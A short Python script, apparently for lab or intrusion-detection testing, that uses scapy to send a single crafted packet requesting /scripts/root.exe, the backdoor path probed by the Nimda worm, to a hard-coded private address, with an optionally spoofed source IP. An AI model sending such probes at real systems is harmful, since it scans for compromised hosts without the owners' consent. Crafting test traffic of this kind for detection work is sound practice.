from scapy.all import IP, TCP, Raw, send

def send_nimda_packet(target_ip, target_port = 80, src_ip = "", src_port = 12345):
    packet = (
        IP(src = src_ip, dst = target_ip)
        / TCP(sport = src_port, dport = target_port)
        / Raw(load = "GET /scripts/root.exe HTTP/1.0\r\nHost: example.com\r\n\r\n")
    )
    send(packet)
    

if __name__ == "__main__":
    target_ip = "192.168.3.252"
    send_nimda_packet(target_ip)